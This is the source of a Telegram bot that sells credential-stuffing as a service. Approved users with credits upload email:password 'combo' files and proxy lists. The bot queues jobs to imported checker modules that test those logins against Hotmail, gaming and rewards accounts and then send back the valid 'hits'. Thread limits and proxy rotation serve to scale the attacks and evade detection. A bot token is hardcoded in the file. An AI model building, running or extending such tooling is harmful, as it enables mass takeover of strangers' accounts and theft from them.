import os
import logging
import threading
import asyncio
import time
import shutil
import glob
import random
import html
from queue import PriorityQueue
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters, CallbackQueryHandler
from telegram.constants import ParseMode

# Import tools
import flux
import h
import hit
import p7
import pullerv2
import database

# Authorized Admin ID
ADMIN_ID = 5944410248
# HARDCODED BOT TOKEN AS REQUESTED
BOT_TOKEN = "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak"

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

UPLOADS_DIR = "uploads"
os.makedirs(UPLOADS_DIR, exist_ok=True)

# Task Queue System
task_queue = PriorityQueue()

# --- UI Helpers ---

def get_footer():
    return f"\n\n✨ <b>Credits to Admin</b> [<code>{ADMIN_ID}</code>]"

def get_header(title):
    return f"🛡 <b>{html.escape(title)}</b>\n━━━━━━━━━━━━━━━━━━━━\n"

def restricted(func):
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        if not update.effective_user: return
        user_id = update.effective_user.id
        if database.is_banned(user_id):
            await update.message.reply_text("🚫 <b>You are BANNED from using this bot.</b>", parse_mode=ParseMode.HTML)
            return
        if not database.is_approved(user_id):
            await update.message.reply_text(
                f"🚫 <b>Access Denied</b>\n\nContact Admin [<code>{ADMIN_ID}</code>] for access.\nID: <code>{user_id}</code>{get_footer()}",
                parse_mode=ParseMode.HTML
            )
            return
        return await func(update, context, *args, **kwargs)
    return wrapped

def admin_only(func):
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        if not update.effective_user: return
        if not database.is_admin(update.effective_user.id):
            await update.message.reply_text(f"❌ <b>Admin Only</b>{get_footer()}", parse_mode=ParseMode.HTML)
            return
        return await func(update, context, *args, **kwargs)
    return wrapped

# --- Command Handlers ---

@restricted
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    credits = database.get_credits(user_id)
    settings = database.get_user_settings(user_id)
    plan = database.get_plan(user_id)

    keyboard = [
        [InlineKeyboardButton("🎮 Flux Scraper", callback_data='tool_flux'),
         InlineKeyboardButton("📧 Hotmail (H)", callback_data='tool_h')],
        [InlineKeyboardButton("🔥 Adv. Hotmail (HIT)", callback_data='tool_hit'),
         InlineKeyboardButton("💰 Rewards (P7)", callback_data='tool_p7')],
        [InlineKeyboardButton("🗝 Code Puller (V2)", callback_data='tool_pullerv2')],
        [InlineKeyboardButton("⚙️ Settings", callback_data='settings'),
         InlineKeyboardButton("👤 Profile", callback_data='profile')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    msg = (
        f"{get_header('TOOLBOT DASHBOARD')}"
        f"🏅 <b>Plan:</b> <code>{plan}</code>\n"
        f"💳 <b>Credits:</b> <code>{credits}</code>\n"
        f"🧵 <b>Threads:</b> <code>{settings['threads']}</code>\n"
        f"🌐 <b>Proxy File:</b> <code>{'SET ✅' if settings['proxy_file'] else 'NOT SET ❌'}</code>\n\n"
        f"Select a tool to begin execution:{get_footer()}"
    )
    await update.message.reply_text(msg, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

@restricted
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        f"{get_header('HELP & COMMANDS')}"
        f"<b>User Commands:</b>\n"
        f"/start - Dashboard & Tool Selection\n"
        f"/me - Check Credits & Profile\n"
        f"/threads &lt;num&gt; - Set checking threads (max 50)\n"
        f"/help - Show this message\n\n"
        f"<b>Limits:</b>\n"
        f"• Max <b>5 threads</b> without proxy file.\n"
        f"• Max <b>50 threads</b> with proxy file.\n\n"
        f"<b>VIP Queue Priority:</b>\n"
        f"1. 👑 Owner (Instant Access)\n"
        f"2. ⭐ Premium Users (Priority)\n"
        f"3. 👤 Free Users\n\n"
        f"<b>Instructions:</b>\n"
        f"1. Select a tool.\n"
        f"2. Upload proxy file and select 'Proxy File' (optional).\n"
        f"3. Upload combo file and select 'Combo File'.\n"
        f"4. The task will be queued and executed."
    )
    if database.is_admin(update.effective_user.id):
        help_text += "\n\n<b>Admin Commands:</b>\n/approve /revoke /ban /unban /setplan /add_credits /users"
    await update.message.reply_text(help_text + get_footer(), parse_mode=ParseMode.HTML)

@restricted
async def me_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    msg = (
        f"{get_header('USER PROFILE')}"
        f"🆔 <b>ID:</b> <code>{uid}</code>\n"
        f"🏅 <b>Plan:</b> <code>{database.get_plan(uid)}</code>\n"
        f"💳 <b>Credits:</b> <code>{database.get_credits(uid)}</code>\n"
        f"🧵 <b>Threads:</b> <code>{database.get_user_settings(uid)['threads']}</code>\n"
        f"🌐 <b>Proxy File:</b> <code>{'SET ✅' if database.get_user_settings(uid)['proxy_file'] else 'NOT SET ❌'}</code>{get_footer()}"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

@restricted
async def threads_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not context.args:
        await update.message.reply_text(f"🧵 <b>Current Threads:</b> <code>{database.get_user_settings(uid)['threads']}</code>", parse_mode=ParseMode.HTML)
        return
    try:
        n = int(context.args[0])
        if n < 1: raise ValueError
        if not database.get_user_settings(uid)['proxy_file'] and n > 5 and not database.is_admin(uid):
            await update.message.reply_text("❌ <b>Error:</b> Max 5 threads without proxy. Upload proxy file first.", parse_mode=ParseMode.HTML)
            return
        if n > 50 and not database.is_admin(uid): n = 50
        database.update_user_settings(uid, threads=n)
        await update.message.reply_text(f"✅ <b>Threads set to:</b> <code>{n}</code>", parse_mode=ParseMode.HTML)
    except: await update.message.reply_text("❌ <b>Invalid number.</b>", parse_mode=ParseMode.HTML)

# --- Admin Handlers ---

@admin_only
async def approve_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try: database.set_approved(int(context.args[0]), True); await update.message.reply_text("✅ <b>User Approved.</b>", parse_mode=ParseMode.HTML)
    except: await update.message.reply_text("💡 Usage: <code>/approve &lt;id&gt;</code>", parse_mode=ParseMode.HTML)

@admin_only
async def revoke_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try: database.set_approved(int(context.args[0]), False); await update.message.reply_text("✅ <b>User Revoked.</b>", parse_mode=ParseMode.HTML)
    except: await update.message.reply_text("💡 Usage: <code>/revoke &lt;id&gt;</code>", parse_mode=ParseMode.HTML)

@admin_only
async def ban_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try: database.ban_user(int(context.args[0])); await update.message.reply_text("✅ <b>User Banned.</b>", parse_mode=ParseMode.HTML)
    except: await update.message.reply_text("💡 Usage: <code>/ban &lt;id&gt;</code>", parse_mode=ParseMode.HTML)

@admin_only
async def unban_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try: database.unban_user(int(context.args[0])); await update.message.reply_text("✅ <b>User Unbanned.</b>", parse_mode=ParseMode.HTML)
    except: await update.message.reply_text("💡 Usage: <code>/unban &lt;id&gt;</code>", parse_mode=ParseMode.HTML)

@admin_only
async def setplan_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try: database.set_plan(int(context.args[0]), context.args[1]); await update.message.reply_text("✅ <b>Plan set successfully.</b>", parse_mode=ParseMode.HTML)
    except: await update.message.reply_text("💡 Usage: <code>/setplan &lt;id&gt; &lt;plan&gt;</code>", parse_mode=ParseMode.HTML)

@admin_only
async def add_credits_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try: database.add_credits(int(context.args[0]), int(context.args[1])); await update.message.reply_text("✅ <b>Credits added.</b>", parse_mode=ParseMode.HTML)
    except: await update.message.reply_text("💡 Usage: <code>/add_credits &lt;id&gt; &lt;amount&gt;</code>", parse_mode=ParseMode.HTML)

@admin_only
async def users_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    all_users = database.get_all_users()
    rep = f"{get_header('USERS LIST')}"
    for k, v in all_users.items():
        status = "✅" if v.get('approved') else "❌"
        ban_tag = " 🚫" if v.get('banned') else ""
        rep += f"• <code>{k}</code> | {status}{ban_tag} | {html.escape(v.get('plan', 'Free'))} | <code>{v.get('credits', 0)}</code> cr\n"
    await update.message.reply_text(rep, parse_mode=ParseMode.HTML)

# --- Handlers ---

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if not q: return
    await q.answer()
    uid = q.from_user.id
    if database.is_banned(uid) or not database.is_approved(uid): return

    if q.data.startswith('tool_'):
        tool = q.data.split('_')[1]
        context.user_data['selected_tool'] = tool
        await q.edit_message_text(f"{get_header(f'TOOL: {tool.upper()}')}\nUpload your <b>.txt combo file</b> now.{get_footer()}", parse_mode=ParseMode.HTML)
    elif q.data == 'settings':
        s = database.get_user_settings(uid)
        msg = f"{get_header('SETTINGS')}🧵 Threads: <code>{s['threads']}</code>\n🌐 Proxy File: <code>{'SET' if s['proxy_file'] else 'NOT SET'}</code>\n\nUse <code>/threads &lt;n&gt;</code> to change threads.\nUpload a file and select 'Proxy File' to set proxies.{get_footer()}"
        await q.edit_message_text(msg, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data='back_to_start')]]))
    elif q.data == 'profile':
        msg = f"{get_header('PROFILE')}🆔 ID: <code>{uid}</code>\n🏅 Plan: <code>{database.get_plan(uid)}</code>\n💳 Credits: <code>{database.get_credits(uid)}</code>{get_footer()}"
        await q.edit_message_text(msg, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data='back_to_start')]]))
    elif q.data == 'back_to_start':
        s = database.get_user_settings(uid)
        kb = [[InlineKeyboardButton("🎮 Flux Scraper", callback_data='tool_flux'), InlineKeyboardButton("📧 Hotmail (H)", callback_data='tool_h')], [InlineKeyboardButton("🔥 Adv. Hotmail (HIT)", callback_data='tool_hit'), InlineKeyboardButton("💰 Rewards (P7)", callback_data='tool_p7')], [InlineKeyboardButton("🗝 Code Puller (V2)", callback_data='tool_pullerv2')], [InlineKeyboardButton("⚙️ Settings", callback_data='settings'), InlineKeyboardButton("👤 Profile", callback_data='profile')]]
        await q.edit_message_text(f"{get_header('DASHBOARD')}💳 Credits: <code>{database.get_credits(uid)}</code>\n🧵 Threads: <code>{s['threads']}</code>{get_footer()}", reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.HTML)
    elif q.data.startswith('file_'):
        ftype = q.data.split('_')[1]
        fpath = context.user_data.get('last_uploaded_file')
        if ftype == 'proxy':
            database.update_user_settings(uid, proxy_file=fpath)
            await q.edit_message_text(f"✅ <b>Proxy file saved.</b>\nYour thread limit is now <b>50</b>.{get_footer()}", parse_mode=ParseMode.HTML)
        elif ftype == 'combo':
            tool = context.user_data.get('selected_tool')
            if not tool: await q.edit_message_text("❌ <b>Select tool first.</b>", parse_mode=ParseMode.HTML); return
            if database.get_credits(uid) <= 0: await q.edit_message_text("❌ <b>No credits.</b>", parse_mode=ParseMode.HTML); return

            plan = database.get_plan(uid).lower()
            priority = 2 # Free
            if database.is_admin(uid): priority = 0
            elif "premium" in plan: priority = 1

            queue_pos = task_queue.qsize() + 1
            st_msg = await q.edit_message_text(f"⏳ <b>Queued Task...</b>\n\nTool: <b>{html.escape(tool.upper())}</b>\nPriority: <code>{plan.upper()}</code>\nPosition: <code>#{queue_pos}</code>\n\n<i>Processing will start automatically.</i>{get_footer()}", parse_mode=ParseMode.HTML)

            task_queue.put((priority, time.time(), {
                "tool": tool,
                "fpath": fpath,
                "cid": q.message.chat_id,
                "mid": st_msg.message_id,
                "uid": uid,
                "settings": database.get_user_settings(uid)
            }))

async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user: return
    uid = update.effective_user.id
    if database.is_banned(uid) or not database.is_approved(uid): return
    doc = update.message.document
    if not doc or not doc.file_name.lower().endswith('.txt'):
        await update.message.reply_text("❌ <b>Error:</b> Please upload a <code>.txt</code> file.", parse_mode=ParseMode.HTML)
        return
    f = await context.bot.get_file(doc.file_id)
    path = os.path.join(UPLOADS_DIR, f"{uid}_{int(time.time())}_{doc.file_name}")
    await f.download_to_drive(path)
    context.user_data['last_uploaded_file'] = path
    kb = [[InlineKeyboardButton("📄 Combo File", callback_data='file_combo'), InlineKeyboardButton("🌐 Proxy File", callback_data='file_proxy')]]
    await update.message.reply_text(f"📂 <b>File Received:</b> <code>{html.escape(doc.file_name)}</code>\n\nWhat is this for?", reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.HTML)

# --- Queue Worker ---

def queue_worker(application):
    logger.info("Task Worker Thread Started.")
    while True:
        try:
            priority, t_stamp, task = task_queue.get()
            uid = task["uid"]
            tool = task["tool"]
            cid = task["cid"]
            mid = task["mid"]
            fpath = task["fpath"]
            settings = task["settings"]

            # Start message
            asyncio.run_coroutine_threadsafe(
                application.bot.edit_message_text(
                    chat_id=cid, message_id=mid,
                    text=f"🚀 <b>Starting Task: {html.escape(tool.upper())}</b>\n━━━━━━━━━━━━━\nStatus: <code>Initializing execution engine...</code>{get_footer()}",
                    parse_mode=ParseMode.HTML
                ),
                application.loop
            )

            # Deduct credit
            database.deduct_credit(uid)

            # Run tool
            run_tool_sync(tool, fpath, cid, mid, application.loop, settings, application.bot)

            task_queue.task_done()
        except Exception as e:
            logger.error(f"Worker Error: {e}")
            time.sleep(2)

# --- Engine ---

def run_tool_sync(tool, fpath, cid, mid, loop, settings, bot):
    last_up = [0]
    ival = 5
    th = settings['threads']
    pf = settings['proxy_file']
    plist = []
    if pf and os.path.exists(pf):
        try:
            with open(pf, 'r') as f:
                for l in f:
                    p = l.strip()
                    if p:
                        if "://" not in p: p = "http://" + p
                        plist.append(p)
        except: pass

    def callback(text):
        if time.time() - last_up[0] < ival and "Finished" not in text and "Completed" not in text: return
        last_up[0] = time.time()
        asyncio.run_coroutine_threadsafe(
            bot.edit_message_text(
                chat_id=cid, message_id=mid,
                text=f"⚙️ <b>PROGRESS: {html.escape(tool.upper())}</b>\n━━━━━━━━━━━━━\n{html.escape(text)}{get_footer()}",
                parse_mode=ParseMode.HTML
            ),
            loop
        )

    # Immediate feedback
    callback("🚀 Engines started. Loading accounts into tool...")

    try:
        res_path = None
        if tool == 'flux':
            if plist:
                 with open("proxies.txt", "w") as f:
                      for p in plist: f.write(p + "\n")
            p = flux.ComboParser(fpath); accs = p.parse()
            if not accs: callback("❌ No valid accounts found."); return
            s = flux.Settings(); s.set('max_threads', th)
            scr = flux.MultiPlatformScraper(accs, s, "All", log_callback=callback)
            scr.check_all(); res_path = scr.results_folder
        elif tool == 'h':
            chk = h.HotmailChecker(log_callback=callback, proxies=plist)
            chk.run(fpath, num_threads=th); res_path = "Hotmail-Hits.txt"
        elif tool == 'hit':
            with open(fpath, 'r', encoding='utf-8', errors='ignore') as f: lines = [l.strip() for l in f.readlines() if ':' in l]
            if not lines: callback("❌ No valid accounts."); return
            stats = hit.LiveStats(len(lines), callback=callback)
            mgr = hit.EnhancedResultManager(f"bot_{int(time.time())}", "full")
            def prc(line):
                try:
                    e, p = line.split(':', 1); c = hit.UnifiedChecker(check_mode="full_enhanced")
                    if plist: pr = random.choice(plist); c.session.proxies = {'http': pr, 'https': pr}
                    r = c.check(e.strip(), p.strip()); stats.update(r["status"], r if r["status"] == "HIT" else None)
                    if r["status"] == "HIT": mgr.save_hit(e, p, r)
                    stats.print_live("full_enhanced")
                except: pass
            from concurrent.futures import ThreadPoolExecutor
            with ThreadPoolExecutor(max_workers=th) as ex: ex.map(prc, lines)
            res_path = mgr.base_folder
        elif tool == 'p7':
            proxy = random.choice(plist) if plist else None
            p7.check_bulk(fpath, threads=th, proxy=proxy, callback=callback)
            res_path = "Results"
        elif tool == 'pullerv2':
            with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                 accs = [l.strip().split(':', 1) for l in f if ':' in l]
            if not accs: callback("❌ No valid accounts."); return
            if plist:
                 with open("proxies.txt", "w") as f:
                      for p in plist: f.write(p + "\n")
            pullerv2.MAX_THREADS_FETCHER = th; pullerv2.MAX_THREADS_VALIDATOR = th
            pullerv2.phase1_fetch_codes(accs, callback=callback)
            pullerv2.phase2_validate_codes(accs, codes=None, callback=callback)
            fs = glob.glob("validation_results_*")
            if fs: res_path = max(fs, key=os.path.getmtime)

        asyncio.run_coroutine_threadsafe(bot.send_message(chat_id=cid, text=f"✅ <b>Task {html.escape(tool.upper())} finished!</b>"), loop)
        if res_path and os.path.exists(res_path):
            final = res_path
            if os.path.isdir(res_path):
                shutil.make_archive(res_path, 'zip', res_path); final = f"{res_path}.zip"
            asyncio.run_coroutine_threadsafe(bot.send_document(chat_id=cid, document=open(final, 'rb'), caption=f"📦 <b>Results: {html.escape(tool.upper())}</b>{get_footer()}", parse_mode=ParseMode.HTML), loop)
        else: callback("✅ Process finished. No results generated.")
    except Exception as e:
        logger.error(f"Error {tool}: {e}")
        asyncio.run_coroutine_threadsafe(bot.send_message(chat_id=cid, text=f"❌ <b>Execution Error:</b> <code>{html.escape(str(e))}</code>", parse_mode=ParseMode.HTML), loop)

async def post_init(application):
    threading.Thread(target=queue_worker, args=(application,), daemon=True).start()

if __name__ == '__main__':
    if not database.is_approved(ADMIN_ID): database.set_approved(ADMIN_ID, True)
    if not BOT_TOKEN or ":" not in BOT_TOKEN:
        print("CRITICAL ERROR: No BOT_TOKEN.")
        exit(1)

    app = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()

    app.add_handler(CommandHandler('start', start))
    app.add_handler(CommandHandler('help', help_command))
    app.add_handler(CommandHandler('me', me_command))
    app.add_handler(CommandHandler('threads', threads_command))
    app.add_handler(CommandHandler('approve', approve_handler))
    app.add_handler(CommandHandler('revoke', revoke_handler))
    app.add_handler(CommandHandler('ban', ban_handler))
    app.add_handler(CommandHandler('unban', unban_handler))
    app.add_handler(CommandHandler('setplan', setplan_handler))
    app.add_handler(CommandHandler('add_credits', add_credits_handler))
    app.add_handler(CommandHandler('users', users_handler))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_doc))

    app.run_polling()
